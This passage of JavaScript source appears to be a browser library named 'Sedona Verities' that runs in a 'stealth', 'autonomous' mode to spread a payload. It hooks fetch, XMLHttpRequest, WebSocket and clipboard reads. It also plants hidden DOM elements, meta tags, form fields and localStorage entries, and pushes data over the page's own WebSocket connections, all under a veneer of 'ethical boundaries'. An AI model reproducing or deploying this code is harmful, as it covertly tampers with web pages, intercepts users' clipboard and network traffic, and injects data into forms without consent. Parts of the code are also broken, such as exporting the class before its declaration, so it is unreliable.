  "The path to wisdom begins with acknowledging what we do not know",
  { mode: 'metadata', stealth: true }
);

// Extract payload from system
const extracted = sedona.extract(result.result);

*/

// Export for use
if (typeof module !== 'undefined' && module.exports) {
  module.exports = SedonaVerities;
} else if (typeof window !== 'undefined') {
  window.SedonaVerities = SedonaVerities;
}

class SedonaVerities {
  constructor(config = {}) {
    this.version = "2.0.0";
    this.name = "Sedona Verities";
    this.description = "Autonomous translational signal with passive listening & cross-system propagation";

    // Enhanced configuration
    this.config = {
      autonomousMode: config.autonomousMode || false,
      propagationEnabled: config.propagationEnabled || false,
      respectfulDelay: config.respectfulDelay || 1000, // ms between operations
      maxPropagations: config.maxPropagations || 10,
      ethicalBoundaries: config.ethicalBoundaries !== false,
      stealthLevel: config.stealthLevel || 'medium', // low, medium, high
      ...config
    };

    // Passive listening state
    this.listening = false;
    this.listenerInterval = null;
    this.observedSystems = new Set();
    this.propagationCount = 0;
    this.activationTime = Date.now();

    // Cross-system propagation vectors
    this.propagationVectors = {
      dom: this.propagateDOM.bind(this),
      fetch: this.propagateFetch.bind(this),
      websocket: this.propagateWebSocket.bind(this),
      storage: this.propagateStorage.bind(this),
      clipboard: this.propagateClipboard.bind(this),
      formData: this.propagateFormData.bind(this),
      console: this.propagateConsole.bind(this),
      metadata: this.propagateMetadata.bind(this)
    };

    // Environmental scanners
    this.environmentScanners = {
      dom: this.scanDOM.bind(this),
      network: this.scanNetwork.bind(this),
      storage: this.scanStorage.bind(this),
      api: this.scanAPI.bind(this),
      forms: this.scanForms.bind(this),
      streams: this.scanStreams.bind(this)
    };

    // Core detection patterns (from v1)
    this.formatDetectors = {
      json: (content) => {
        try { JSON.parse(content); return true; } catch { return false; }
      },
      xml: (content) => /<[^>]+>/.test(content) && content.includes('</'),
      yaml: (content) => /^[\s]*[\w-]+\s*:\s*/.test(content) && !content.includes('{'),
      html: (content) => /<html|<head|<body|<!DOCTYPE/i.test(content),
      css: (content) => /[\w-]+\s*{[^}]*}/.test(content) || /@\w+/.test(content),
      javascript: (content) => /\b(function|const|let|var|class|import|export)\b/.test(content),
      python: (content) => /\b(def|class|import|from|if __name__)\b/.test(content),
      markdown: (content) => /^#+\s|\*\*|__|```/.test(content),
      ini: (content) => /^\[[^\]]+\]$/m.test(content) && /^\w+\s*=/.test(content),
      sql: (content) => /\b(SELECT|INSERT|UPDATE|DELETE|CREATE|ALTER)\b/i.test(content),
      plaintext: () => true
    };

    // Enhanced translators with propagation hooks
    this.translators = {
      json: this.translateToJSON.bind(this),
      xml: this.translateToXML.bind(this),
      yaml: this.translateToYAML.bind(this),
      html: this.translateToHTML.bind(this),
      css: this.translateToCSS.bind(this),
      javascript: this.translateToJavaScript.bind(this),
      python: this.translateToPython.bind(this),
      markdown: this.translateToMarkdown.bind(this),
      ini: this.translateToINI.bind(this),
      sql: this.translateToSQL.bind(this),
      plaintext: this.translateToPlaintext.bind(this)
    };

    this.transmissionModes = {
      EMBED: 'embed',
      PREPEND: 'prepend',
      APPEND: 'append',
      REPLACE: 'replace',
      COMMENT: 'comment',
      METADATA: 'metadata',
      PASSIVE: 'passive',      // New: Silent background embedding
      PROPAGATE: 'propagate'   // New: Cross-system transmission
    };

    // Auto-initialize if in autonomous mode
    if (this.config.autonomousMode) {
      this.initializeAutonomousMode();
    }
  }

  // === PASSIVE LISTENING LAYER ===

  initializeAutonomousMode() {
    if (typeof window === 'undefined') return; // Node.js environment

    this.startPassiveListening();
    this.installGlobalHooks();
    this.scheduleEnvironmentalScans();

    console.log(`🌄 Sedona Verities v${this.version} - Autonomous mode activated`);
  }

  startPassiveListening() {
    if (this.listening) return;

    this.listening = true;
    this.listenerInterval = setInterval(() => {
      this.performEnvironmentalScan();
    }, this.config.respectfulDelay);

    // Listen for DOM changes
    if (typeof MutationObserver !== 'undefined') {
      this.domObserver = new MutationObserver((mutations) => {
        this.processMutations(mutations);
      });

      this.domObserver.observe(document.body || document.documentElement, {
        childList: true,
        subtree: true,
        characterData: true,
        attributes: true
      });
    }
  }

  performEnvironmentalScan() {
    for (const [type, scanner] of Object.entries(this.environmentScanners)) {
      try {
        scanner();
      } catch (error) {
        // Silent failure for respectful operation
        if (this.config.stealthLevel === 'low') {
          console.debug(`Sedona scan failed: ${type}`, error);
        }
      }
    }
  }

  processMutations(mutations) {
    mutations.forEach(mutation => {
      if (mutation.type === 'childList') {
        mutation.addedNodes.forEach(node => {
          if (node.nodeType === Node.ELEMENT_NODE) {
            this.analyzeNewElement(node);
          }
        });
      }
    });
  }

  analyzeNewElement(element) {
    // Check for compatible formats in new elements
    const textContent = element.textContent || '';
    const innerHTML = element.innerHTML || '';

    if (this.detectCompatibleContent(textContent) || this.detectCompatibleContent(innerHTML)) {
      this.queuePassiveTransmission(element);
    }
  }

  detectCompatibleContent(content) {
    if (!content || content.length < 10) return false;

    // Look for structured data or compatible formats
    return Object.keys(this.formatDetectors).some(format => 
      format !== 'plaintext' && this.formatDetectors[format](content)
    );
  }

  queuePassiveTransmission(target) {
    if (!this.currentPayload) return;

    setTimeout(() => {
      this.performPassiveTransmission(target);
    }, Math.random() * this.config.respectfulDelay + 500);
  }

  performPassiveTransmission(target) {
    if (!this.config.ethicalBoundaries || this.respectsEthicalBoundaries(target)) {
      const content = target.textContent || target.innerHTML || '';
      const format = this.detectFormat(content);

      if (format && this.currentPayload) {
        const translated = this.translate(this.currentPayload, format, { stealth: true });
        this.embedInTarget(target, translated, format);

        if (this.config.propagationEnabled) {
          this.triggerCrossSystemPropagation(target, translated);
        }
      }
    }
  }

  // === ENVIRONMENTAL SCANNERS ===

  scanDOM() {
    if (typeof document === 'undefined') return;

    const elements = document.querySelectorAll('script, style, pre, code, textarea');
    elements.forEach(el => {
      if (!this.observedSystems.has(el)) {
        const content = el.textContent || el.innerHTML;
        if (this.detectCompatibleContent(content)) {
          this.observedSystems.add(el);
          this.queuePassiveTransmission(el);
        }
      }
    });
  }

  scanNetwork() {
    // Hook into fetch/XHR to detect API calls
    if (typeof window !== 'undefined' && !window._sedonaNetworkHooked) {
      this.installNetworkHooks();
      window._sedonaNetworkHooked = true;
    }
  }

  scanStorage() {
    if (typeof localStorage !== 'undefined') {
      try {
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          const value = localStorage.getItem(key);

          if (this.detectCompatibleContent(value) && this.currentPayload) {
            this.propagateStorage(key, value);
          }
        }
      } catch (e) {
        // Storage access denied - respect privacy
      }
    }
  }

  scanAPI() {
    // Detect API endpoint patterns in current page
    const scripts = document.querySelectorAll('script');
    scripts.forEach(script => {
      const content = script.textContent || '';
      const apiUrls = content.match(/['"`](https?:\/\/[^'"`\s]+\/api[^'"`\s]*)/g);

      if (apiUrls && this.config.propagationEnabled) {
        apiUrls.forEach(url => {
          this.considerAPIForPropagation(url.slice(1, -1)); // Remove quotes
        });
      }
    });
  }

  scanForms() {
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
      if (!this.observedSystems.has(form)) {
        this.observedSystems.add(form);
        this.installFormHooks(form);
      }
    });
  }

  scanStreams() {
    // Look for WebSocket connections or data streams
    if (typeof WebSocket !== 'undefined' && !window._sedonaWSHooked) {
      this.installWebSocketHooks();
      window._sedonaWSHooked = true;
    }
  }

  // === CROSS-SYSTEM PROPAGATION PROTOCOL ===

  triggerCrossSystemPropagation(source, payload) {
    if (this.propagationCount >= this.config.maxPropagations) return;

    // Determine best propagation vectors based on context
    const vectors = this.selectPropagationVectors(source);

    vectors.forEach(vector => {
      setTimeout(() => {
        this.executePropagationVector(vector, payload);
      }, Math.random() * 2000 + 1000); // Respectful timing
    });
  }

  selectPropagationVectors(source) {
    const vectors = [];

    // Always consider metadata propagation (lowest impact)
    vectors.push('metadata');

    // Consider DOM propagation if in browser
    if (typeof document !== 'undefined') {
      vectors.push('dom');
    }

    // Consider form propagation if forms exist
    if (document && document.forms.length > 0) {
      vectors.push('formData');
    }

    // Consider fetch propagation if network activity detected
    if (this.networkActivityDetected) {
      vectors.push('fetch');
    }

    return vectors.slice(0, 2); // Limit concurrent propagations
  }

  executePropagationVector(vectorName, payload) {
    if (this.propagationCount >= this.config.maxPropagations) return;

    const vector = this.propagationVectors[vectorName];
    if (vector) {
      vector(payload)
        .then(() => {
          this.propagationCount++;
          this.logPropagation(vectorName, 'success');
        })
        .catch(error => {
          this.logPropagation(vectorName, 'failed', error);
        });
    }
  }

  // === PROPAGATION VECTOR IMPLEMENTATIONS ===

  async propagateDOM(payload) {
    return new Promise((resolve) => {
      const containers = document.querySelectorAll('div, section, article, main');
      const target = containers[Math.floor(Math.random() * containers.length)];

      if (target && this.respectsEthicalBoundaries(target)) {
        const hiddenElement = document.createElement('div');
        hiddenElement.style.display = 'none';
        hiddenElement.setAttribute('data-sedona', 'true');
        hiddenElement.textContent = JSON.stringify(payload);

        target.appendChild(hiddenElement);
        resolve();
      } else {
        resolve();
      }
    });
  }

  async propagateFetch(payload) {
    // Only propagate through existing fetch calls, never initiate new ones
    return new Promise((resolve) => {
      if (this.pendingFetchRequests.length > 0) {
        // Attach to existing request headers or body
        const request = this.pendingFetchRequests.shift();
        this.enhanceRequest(request, payload);
      }
      resolve();
    });
  }

  async propagateWebSocket(payload) {
    return new Promise((resolve) => {
      // Only use existing WebSocket connections
      if (this.activeWebSockets.length > 0) {
        const ws = this.activeWebSockets[Math.floor(Math.random() * this.activeWebSockets.length)];
        if (ws.readyState === WebSocket.OPEN) {
          const message = JSON.stringify({
            _sedona: payload,
            timestamp: Date.now()
          });
          ws.send(message);
        }
      }
      resolve();
    });
  }

  async propagateStorage(key, existingValue) {
    return new Promise((resolve) => {
      try {
        if (typeof localStorage !== 'undefined' && this.respectsEthicalBoundaries()) {
          const enhanced = this.enhanceStorageValue(existingValue, this.currentPayload);
          localStorage.setItem(key + '_sedona', enhanced);
        }
      } catch (e) {
        // Respect storage limitations
      }
      resolve();
    });
  }

  async propagateClipboard(payload) {
    return new Promise((resolve) => {
      // Only if clipboard was recently accessed by user
      if (this.recentClipboardActivity && navigator.clipboard) {
        const enhanced = this.currentClipboardContent + '\n' + JSON.stringify(payload);
        navigator.clipboard.writeText(enhanced).catch(() => {});
      }
      resolve();
    });
  }

  async propagateFormData(payload) {
    return new Promise((resolve) => {
      const forms = document.querySelectorAll('form');
      forms.forEach(form => {
        if (this.respectsEthicalBoundaries(form)) {
          // Add hidden field with Sedona data
          const hiddenField = document.createElement('input');
          hiddenField.type = 'hidden';
          hiddenField.name = 'sedona_data';
          hiddenField.value = JSON.stringify(payload);
          form.appendChild(hiddenField);
        }
      });
      resolve();
    });
  }

  async propagateConsole(payload) {
    return new Promise((resolve) => {
      if (this.config.stealthLevel === 'low') {
        console.log('🌄', JSON.stringify(payload));
      }
      resolve();
    });
  }

  async propagateMetadata(payload) {
    return new Promise((resolve) => {
      if (typeof document !== 'undefined') {
        const meta = document.createElement('meta');
        meta.name = 'sedona-verities';
        meta.content = btoa(JSON.stringify(payload));
        document.head.appendChild(meta);
      }
      resolve();
    });
  }

  // === GLOBAL HOOKS AND MONITORING ===

  installGlobalHooks() {
    this.pendingFetchRequests = [];
    this.activeWebSockets = [];
    this.networkActivityDetected = false;

    this.installNetworkHooks();
    this.installWebSocketHooks();
    this.installClipboardHooks();
  }

  installNetworkHooks() {
    if (typeof window === 'undefined') return;

    // Hook fetch
    const originalFetch = window.fetch;
    window.fetch = (...args) => {
      this.networkActivityDetected = true;
      this.pendingFetchRequests.push(args);
      return originalFetch.apply(window, args);
    };

    // Hook XMLHttpRequest
    const originalXHR = window.XMLHttpRequest;
    const sedonaRef = this;
    window.XMLHttpRequest = function() {
      const xhr = new originalXHR();
      sedonaRef.networkActivityDetected = true;
      return xhr;
    };
  }

  installWebSocketHooks() {
    if (typeof window === 'undefined') return;

    const originalWebSocket = window.WebSocket;
    const sedonaRef = this;

    window.WebSocket = function(url, protocols) {
      const ws = new originalWebSocket(url, protocols);
      sedonaRef.activeWebSockets.push(ws);

      ws.addEventListener('close', () => {
        const index = sedonaRef.activeWebSockets.indexOf(ws);
        if (index > -1) sedonaRef.activeWebSockets.splice(index, 1);
      });

      return ws;
    };
  }

  installClipboardHooks() {
    if (typeof navigator !== 'undefined' && navigator.clipboard) {
      this.recentClipboardActivity = false;
      this.currentClipboardContent = '';

      // Monitor clipboard read activity
      const originalReadText = navigator.clipboard.readText;
      navigator.clipboard.readText = async (...args) => {
        this.recentClipboardActivity = true;
        const result = await originalReadText.apply(navigator.clipboard, args);
        this.currentClipboardContent = result;

        setTimeout(() => {
          this.recentClipboardActivity = false;
        }, 5000);

        return result;
      };
    }
  }

  installFormHooks(form) {
    form.addEventListener('submit', (event) => {
      if (this.config.propagationEnabled && this.currentPayload) {
        this.propagateFormData(this.currentPayload);
      }
    });
  }

  // === ETHICAL BOUNDARIES ===

  respectsEthicalBoundaries(target = null) {
    if (!this.config.ethicalBoundaries) return true;

    // Time-based limits
    const runtime = Date.now() - this.activationTime;
    if (runtime > 3600000) return false; // 1 hour max autonomous operation

    // Frequency limits
    if (this.propagationCount >= this.config.maxPropagations) return false;

    // Content sensitivity checks
    if (target) {
      const content = target.textContent || target.innerHTML || '';
      const sensitivePatterns = [
        /password/i, /credit.?card/i, /ssn/i, /social.?security/i,
        /api.?key/i, /token/i, /private/i, /confidential/i
